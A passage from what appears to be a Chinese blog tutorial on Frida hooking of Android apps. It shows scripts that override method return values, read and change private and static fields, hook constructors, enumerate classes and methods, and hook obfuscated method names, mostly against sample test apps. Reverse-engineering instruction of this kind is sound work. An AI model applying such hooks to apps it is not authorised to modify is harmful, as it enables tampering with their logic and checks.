对方法的结果进行修改（相当于重写了该方法）</span></span><br><span class="line">              <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;hhello&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hook addNumber方法 function参数列表可以什么都不填</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">addNumber</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// 内置有变量[argument]，为方法的参数列表</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addNumber arguments[&quot;</span> + i + <span class="string">&quot;]=&quot;</span> + <span class="variable language_">arguments</span>[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">addNumber</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>], <span class="variable language_">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addNumber arg,result: &quot;</span>, <span class="variable language_">arguments</span>, result);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">99</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Frida一附加上，就执行函数</span></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h3 id="非静态方法调用Java-choose"><a href="#非静态方法调用Java-choose" class="headerlink" title="非静态方法调用Java.choose"></a>非静态方法调用Java.choose</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 在内存中搜索类的实例</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>, &#123;</span><br><span class="line">            <span class="comment">// 如果匹配上执行回调，参数为类实例</span></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found `HookedObject` instance:&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// 打印私有成员变量的值，需要[field].value</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance.score =&quot;</span>, instance.<span class="property">score</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// 打印静态成员变量的值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HookedObject.msg =&quot;</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">msg</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// 修改成员变量的值</span></span><br><span class="line">                instance.<span class="property">score</span>.<span class="property">value</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Integer&quot;</span>).<span class="built_in">parseInt</span>(<span class="string">&quot;-900&quot;</span>);</span><br><span class="line">                <span class="comment">// 打印修改之后的值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance.score =&quot;</span>, instance.<span class="property">score</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// 与方法同名的成员变量，需前面加_</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance.stringTwo =&quot;</span>, instance.<span class="property">_stringTwo</span>.<span class="property">value</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 搜索完成执行回调</span></span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found Completed&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Frida附加上后延迟5秒执行，期间由于逻辑问题需要主动点击按钮来实例化对象</span></span><br><span class="line"><span class="built_in">setTimeout</span>(invoke, <span class="number">5000</span>);</span><br></pre></td></tr></table></figure><h3 id="静态变量修改"><a href="#静态变量修改" class="headerlink" title="静态变量修改"></a>静态变量修改</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">staticField</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 定义一个名为 staticField 的函数，没有参数。</span></span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// Java.perform 是一个 Frida API，用于确保在当前线程上执行以下代码块。</span></span><br><span class="line">        <span class="comment">// 这通常用于确保代码在 Java 虚拟机上下文中执行。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> divscale = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.junior.util.Arith&quot;</span>).<span class="property">DEF_DIV_SCALE</span>.<span class="property">value</span>;</span><br><span class="line">        <span class="comment">// 使用 Java.use 方法获取对类 com.example.junior.util.Arith 的引用，</span></span><br><span class="line">        <span class="comment">// 然后访问静态字段 DEF_DIV_SCALE 的值，并将其赋给变量 divscale。</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;divscale1 is =&gt;&quot;</span>, divscale);</span><br><span class="line">        <span class="comment">// 使用 console.log 打印原始的 DEF_DIV_SCALE 字段的值。</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.junior.util.Arith&quot;</span>).<span class="property">DEF_DIV_SCALE</span>.<span class="property">value</span> = <span class="number">20</span>;</span><br><span class="line">        <span class="comment">// 再次使用 Java.use 方法访问类 com.example.junior.util.Arith，</span></span><br><span class="line">        <span class="comment">// 并将静态字段 DEF_DIV_SCALE 的值修改为 20。</span></span><br><span class="line"></span><br><span class="line">        divscale = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.junior.util.Arith&quot;</span>).<span class="property">DEF_DIV_SCALE</span>.<span class="property">value</span>;</span><br><span class="line">        <span class="comment">// 重新读取修改后的 DEF_DIV_SCALE 字段的值，并更新变量 divscale。</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;divscale2 is =&gt;&quot;</span>, divscale);</span><br><span class="line">        <span class="comment">// 再次打印修改后的 DEF_DIV_SCALE 字段的值，以验证是否成功修改。</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非静态函数中的变量修改"><a href="#非静态函数中的变量修改" class="headerlink" title="非静态函数中的变量修改"></a>非静态函数中的变量修改</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dynamicField</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 定义一个名为 dynamicField 的函数，没有参数。</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// Java.perform 是一个 Frida API，用于确保在当前线程上执行以下代码块。</span></span><br><span class="line">        <span class="comment">// 这通常用于确保代码在 Java 虚拟机上下文中执行。</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.junior.CalculatorActivity&quot;</span>, &#123;</span><br><span class="line">            <span class="comment">// Java.choose 是一个 Frida API，用于枚举当前堆上所有属于指定类的实例。</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="comment">// 当找到一个匹配的实例时，会调用此函数。</span></span><br><span class="line">                <span class="comment">// 参数 instance 是当前找到的类的实例。</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance =&gt;&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// 打印找到的实例，以便调试或确认。</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance showText is =&gt;&quot;</span>, instance.<span class="property">showText</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// 打印实例中 showText 字段的当前值。</span></span><br><span class="line"></span><br><span class="line">                instance.<span class="property">showText</span>.<span class="property">value</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">                <span class="comment">// 修改实例中 showText 字段的值为 &quot;123&quot;。</span></span><br><span class="line">                <span class="comment">// 这假设 showText 是一个可以访问且可修改的字段。</span></span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">// 当所有实例都已经被枚举后，会调用此函数。</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Search complete&#x27;</span>);</span><br><span class="line">                <span class="comment">// 打印一条消息，表明搜索过程已经完成。</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hook构造函数-init"><a href="#Hook构造函数-init" class="headerlink" title="Hook构造函数$init"></a>Hook构造函数$init</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// We need to replace .$init() instead of .$new(), since .$new() = .alloc() + .init()</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xx.app.Money&#x27;</span>);</span><br><span class="line">    money.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;构造函数Hook中...&quot;</span>, a, b);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hook 构造方法 $init</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MoneyClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.kevin.app.Money&quot;</span>);</span><br><span class="line">    <span class="title class_">MoneyClass</span>.<span class="property">$init</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook Money $init&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.$init();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MoneyClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">    <span class="title class_">MoneyClass</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hook Money init&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> myX = <span class="title class_">StringClass</span>.<span class="title function_">new</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myY = <span class="number">9999</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(myX, myY);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="有参构造主动调用"><a href="#有参构造主动调用" class="headerlink" title="有参构造主动调用"></a>有参构造主动调用</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Utils.test(new Money(200，&quot;美元&quot;))</span></span><br><span class="line"><span class="comment">// 这行是一个注释，表示一个可能的调用场景，即调用 Utils 类的 test 方法，并传入一个 Money 类的实例。</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// Java.perform 是一个 Frida API，用于确保在当前线程上执行以下代码块。</span></span><br><span class="line">    <span class="comment">// 这通常用于确保代码在 Java 虚拟机上下文中执行。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xx.app.Money&#x27;</span>)  <span class="comment">// 如果要自定义实例化就要获取并重写</span></span><br><span class="line">    <span class="comment">// 获取 Money 类的引用，这样就可以在后续代码中使用它来创建新的实例。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xx.app.Utils&#x27;</span>);</span><br><span class="line">    <span class="comment">// 获取 Utils 类的引用。</span></span><br><span class="line"></span><br><span class="line">    utils.<span class="property">test</span>.<span class="title function_">overload</span>(<span class="string">&quot;com.xx.app.Money&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123; </span><br><span class="line">        <span class="comment">// 使用 Frida 的 overload 方法指定要挂钩的 test 方法的具体重载版本，</span></span><br><span class="line">        <span class="comment">// 这里指定的是接受一个 com.xx.app.Money 类型参数的重载。</span></span><br><span class="line">        <span class="comment">// 然后将该方法的实现替换为一个新的函数。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> myBytes = <span class="title class_">StringClass</span>.$new(<span class="string">&quot;Hello World&quot;</span>).<span class="title function_">getBytes</span>();</span><br><span class="line">        <span class="comment">// 创建一个新的 String 实例，内容为 &quot;Hello World&quot;，并获取其字节表示。</span></span><br><span class="line">        <span class="comment">// 注意：这里 StringClass 应该是 Java 类 java.lang.String 的引用，</span></span><br><span class="line">        <span class="comment">// 但是在代码中没有看到 StringClass 的定义，可能是一个疏忽。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新实例化  $new()</span></span><br><span class="line">        <span class="keyword">var</span> mon = money.$new(<span class="number">999</span>,<span class="string">&#x27;我的天&#x27;</span>)</span><br><span class="line">        <span class="comment">// 使用 $new 方法创建一个新的 Money 实例，参数分别是 999 和 &quot;我的天&quot;。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mon.<span class="title function_">getInfo</span>();  <span class="comment">// 根据需求return</span></span><br><span class="line">        <span class="comment">// 调用新创建的 Money 实例的 getInfo 方法，并返回其结果。</span></span><br><span class="line">        <span class="comment">// 这意味着原始的 test 方法的行为被修改，现在它将返回新创建的 Money 实例的信息。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="2-枚举类-方法-接口enumerateLoadedClasses"><a href="#2-枚举类-方法-接口enumerateLoadedClasses" class="headerlink" title="2. 枚举类&amp;方法&amp;接口enumerateLoadedClasses"></a>2. 枚举类&amp;方法&amp;接口enumerateLoadedClasses</h2><h3 id="枚举所有的类并定位类代码示例"><a href="#枚举所有的类并定位类代码示例" class="headerlink" title="枚举所有的类并定位类代码示例"></a>枚举所有的类并定位类代码示例</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;n[*] enumerating classes...&quot;</span>);</span><br><span class="line">    <span class="comment">//Java对象的API enumerateLoadedClasses</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">      <span class="comment">//该回调函数中的_className参数就是类的名称，每次回调时都会返回一个类的名称</span></span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">_className</span>)&#123;</span><br><span class="line">        <span class="comment">//在这里将其输出</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] found instance of &#x27;&quot;</span>+_className+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果只需要打印出com.roysue包下所有类把这段注释即可，想打印其他的替换掉indexOf中参数即可定位到~</span></span><br><span class="line">        <span class="comment">//if(_className.toString().indexOf(&quot;com.roysue&quot;)!=-1)</span></span><br><span class="line">        <span class="comment">//&#123;</span></span><br><span class="line">        <span class="comment">//    console.log(&quot;[*] found instance of &#x27;&quot;+_className+&quot;&#x27;&quot;);</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//会在枚举类结束之后回调一次此函数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] class enuemration complete&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="枚举类的所有方法并定位方法代码"><a href="#枚举类的所有方法并定位方法代码" class="headerlink" title="枚举类的所有方法并定位方法代码"></a>枚举类的所有方法并定位方法代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Hook类的所有方法</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> md5 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xxx.xxx.xxx&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> methods = md5.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_overload_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//确认Java运行时环境是否可用,如果可用，执行以下操作。</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           <span class="comment">//枚举com.roysue.roysueapplication.User$clz类中的所有方法。</span></span><br><span class="line">           <span class="keyword">var</span> a = <span class="title function_">enumMethods</span>(<span class="string">&quot;com.roysue.roysueapplication.User$clz&quot;</span>)</span><br><span class="line">           a.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">s</span>) &#123;</span><br><span class="line">               <span class="comment">//将这些方法名打印到控制台</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(s);</span><br><span class="line">           &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举接口实现"><a href="#枚举接口实现" class="headerlink" title="枚举接口实现"></a>枚举接口实现</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">searchInterface</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 定义一个名为 searchInterface 的函数。</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// Java.perform 确保接下来的代码在 Java 的上下文中执行。</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="comment">// Java.enumerateLoadedClasses 用于枚举当前加载的所有 Java 类。</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">            <span class="comment">// 当所有类都枚举完成后，会调用此函数。这里没有实现任何操作。</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">name, handle</span>)&#123;</span><br><span class="line">                <span class="comment">// 当找到一个匹配的类时，会调用此函数。</span></span><br><span class="line">                <span class="comment">// 参数 name 是类的全名，handle 是类的内部句柄。</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.r0ysue.a0526printout&quot;</span>) &gt; -<span class="number">1</span>) &#123; <span class="comment">// 使用包名进行过滤</span></span><br><span class="line">                    <span class="comment">// 如果类名包含 &quot;com.r0ysue.a0526printout&quot;，则执行以下代码。</span></span><br><span class="line"></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;find class&quot;</span>);</span><br><span class="line">                    <span class="comment">// 打印一条消息表示找到一个类。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                    <span class="comment">// 使用 Java.use 获取类的引用。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> interfaceList = targetClass.<span class="property">class</span>.<span class="title function_">getInterfaces</span>(); <span class="comment">// 使用反射获取类实现的接口数组</span></span><br><span class="line">                    <span class="comment">// 使用 getInterfaces 方法获取类实现的所有接口的列表。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (interfaceList.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 如果类实现了至少一个接口，则执行以下代码。</span></span><br><span class="line"></span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(name) <span class="comment">// 打印类名</span></span><br><span class="line">                        <span class="comment">// 打印类名。</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> interfaceList) &#123;</span><br><span class="line">                            <span class="comment">// 遍历接口列表。</span></span><br><span class="line"></span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\t&quot;</span>, interfaceList[i].<span class="title function_">toString</span>()); <span class="comment">// 直接打印接口名称</span></span><br><span class="line">                            <span class="comment">// 打印每个接口的名称。使用 toString 方法获取接口的字符串表示。</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h2 id="3-不可见函数名hook"><a href="#3-不可见函数名hook" class="headerlink" title="3. 不可见函数名hook"></a>3. 不可见函数名hook</h2><p>当方法名被混淆时֏，打印出来所有的类名<code>%D6%8F</code>,用编码后的字符串hook</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 定义目标类</span></span><br><span class="line">        <span class="keyword">var</span> targetClass = <span class="string">&quot;com.example.hooktest.MainActivity&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> hookCls = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">        <span class="comment">// 获得目标类的所有方法</span></span><br><span class="line">        <span class="keyword">var</span> methods = hookCls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="comment">// 遍历所有方法名</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> methods) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[i].<span class="title function_">toString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">encodeURIComponent</span>(methods[i].<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/^.*?\.([^\s\.\(\)]+)\(.*?$/</span>, <span class="string">&quot;$1&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果有等于不可见字符类的</span></span><br><span class="line">        hookCls[<span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%D6%8F&quot;</span>)]</span><br><span class="line">            .<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;original call: fun(&quot;</span> + x + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> result = <span class="variable language_">this</span>[<span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%D6%8F&quot;</span>)](<span class="number">900</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="4-编写自定义类Java-registerClass"><a href="#4-编写自定义类Java-registerClass" class="headerlink" title="4. 编写自定义类Java.registerClass"></a>4. 编写自定义类Java.registerClass</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 新建类实现的接口，先获取其类</span></span><br><span class="line">    <span class="keyword">var</span> face = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.construct.CheerInterface&quot;</span>);</span><br><span class="line">    <span class="comment">// 创建一个类</span></span><br><span class="line">    <span class="keyword">var</span> beer = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">        <span class="comment">// 类的名称，小写就可</span></span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;com.forgotten.fridatestapp.beer&quot;</span>,</span><br><span class="line">        <span class="comment">// 实现的接口数组，多个来写[a, b]</span></span><br><span class="line">        <span class="attr">implements</span>: [face],</span><br><span class="line">        <span class="comment">// 类中含有的方法</span></span><br><span class="line">        <span class="attr">methods</span>: &#123;</span><br><span class="line">            <span class="attr">cheer</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Cheer!!!&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 其余的可写属性：`super` 父类；`protocols` 该类遵循的协议数组？</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;beer:&quot;</span>, beer);</span><br><span class="line">    <span class="comment">// 调用一下自己编写的类的方法</span></span><br><span class="line">    beer.$new().<span class="title function_">cheer</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="5-Frida-Hook重载overload"><a href="#5-Frida-Hook重载overload" class="headerlink" title="5. Frida Hook重载overload"></a>5. Frida Hook重载overload</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookdecodeimgkey</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> base64 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Base64&quot;</span>)</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span 